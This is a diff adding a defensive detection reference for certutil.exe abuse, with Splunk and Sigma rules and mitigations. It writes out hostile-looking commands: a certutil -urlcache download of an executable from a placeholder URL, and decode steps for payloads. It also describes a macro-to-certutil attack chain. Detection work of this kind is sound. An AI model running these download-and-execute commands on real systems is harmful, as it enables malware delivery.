@@ -1,0 +1,65 @@
+# certutil.exe Abuse Patterns — Detection Reference
+#
+# DISCLAIMER: Educational purposes ONLY.
+# These patterns are for detection rule development, blue team exercises,
+# and security awareness. Do not use without authorization.
+#
+# MITRE ATT&CK: T1105 (Ingress Tool Transfer), T1027.010 (Command Obfuscation)
+#
+# ========================
+# DETECTION RULE PATTERNS:
+# ========================
+#
+# Pattern 1: certutil downloading from internet
+# -----------------------------------------------
+# Command: certutil -urlcache -split -f http://[URL]/file.exe output.exe
+# Detection: certutil.exe with -urlcache AND network connection
+# Sysmon: Event ID 3 (Network Connection) + Event ID 1 (Process Create) with certutil
+#
+# Pattern 2: certutil base64 decode
+# -----------------------------------
+# Command: certutil -decode encoded_payload.b64 decoded_payload.exe
+# Detection: certutil.exe with -decode argument
+# Note: Often preceded by dropping a .b64 file
+#
+# Pattern 3: certutil hex decode
+# --------------------------------
+# Command: certutil -decodehex hex_payload.hex decoded_payload.exe
+# Detection: certutil.exe with -decodehex argument
+#
+# Pattern 4: certutil as part of a chain
+# ----------------------------------------
+# Typical chain from DDE/Macro:
+#   1. Office spawns cmd.exe
+#   2. cmd.exe spawns certutil.exe
+#   3. certutil downloads payload
+#   4. cmd.exe executes downloaded payload
+#
+# ========================
+# SIEM DETECTION RULES:
+# ========================
+#
+# Splunk:
+#   index=windows EventCode=4688 
+#   NewProcessName="*certutil*" 
+#   (CommandLine="*urlcache*" OR CommandLine="*decode*")
+#
+# Sigma rule (YAML):
+#   title: Suspicious Certutil Usage
+#   detection:
+#     selection:
+#       EventID: 4688
+#       NewProcessName|endswith: '\certutil.exe'
+#       ProcessCommandLine|contains:
+#         - '-urlcache'
+#         - '-decode'
+#         - '-decodehex'
+#     condition: selection
+#
+# ========================
+# MITIGATIONS:
+# ========================
+# 1. AppLocker rule to block certutil.exe in untrusted paths
+# 2. Network controls: Block certutil.exe from making internet connections
+# 3. Application control that blocks certutil decode operations
+# 4. Windows Defender Attack Surface Reduction rules
